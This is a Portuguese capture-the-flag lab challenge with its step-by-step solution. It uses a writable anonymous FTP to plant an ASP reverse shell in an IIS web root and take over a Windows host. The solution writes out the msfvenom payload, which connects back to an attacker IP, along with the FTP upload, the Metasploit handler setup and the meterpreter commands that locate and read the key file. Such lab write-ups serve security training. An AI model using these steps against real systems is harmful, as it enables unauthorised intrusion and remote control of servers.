Analise o host 172.16.1.108, identifique e explore a vulnerabilidade.
Consiga uma shell no host e obtenha a key para pontuar.

DICA: Fez enumeração de portas e serviços ? Encontrou quais serviços ? Testou se o FTP tem acesso como anonymous ? Testou se consegue gravar nesse FTP ? Verificou quais diretórios estão disponíveis e o que eles podem conter ? 
E se um desses diretórios fosse o do servidor web, e você pudesse transferir uma shell e ter acesso ao servidor ? ou fazer um shell reverso ?

Resolução

1- msfvenom -p windows/meterpreter/reverse_tcp lhost=172.20.1.198 lport=4444 -f asp -o r.asp
2- ftp anonymous@172.16.1.108
3- ls -> "para descobrir o diretório atual", cd wwwroot/ -> "para entrar no diretório do IIS" e put r.asp -> "para colocar o arquivo asp com o payload do reverse shell no diretório"
4- msfconsole, e use exploit/multi/handler, set payload windows/meterpreter/reverse_tcp, set lhost 172.20.1.198 -> "configuramos o exploit para o mesmo payload do arquivo r.asp e para o ip local"
5- exploit -j -> "para executar o exploit como um job e em segundo plano"
6- http://172.16.1.108:80/r.asp -> "ativamos o nosso arquivo asp de reverse shell acessando a url do IIS"
7- sesseions -i 1 -> "acessamos a conexão estabelecida pelo reverse shell"
8- meterpreter> search -f *key*.txt -> "para encontrar o arquivo que continha a key"
9- meterpreter> shell -> "para acessar o terminar do servidor"
10- type [path_key]/key.txt -> "para visualizar a key que pontuava o vlab"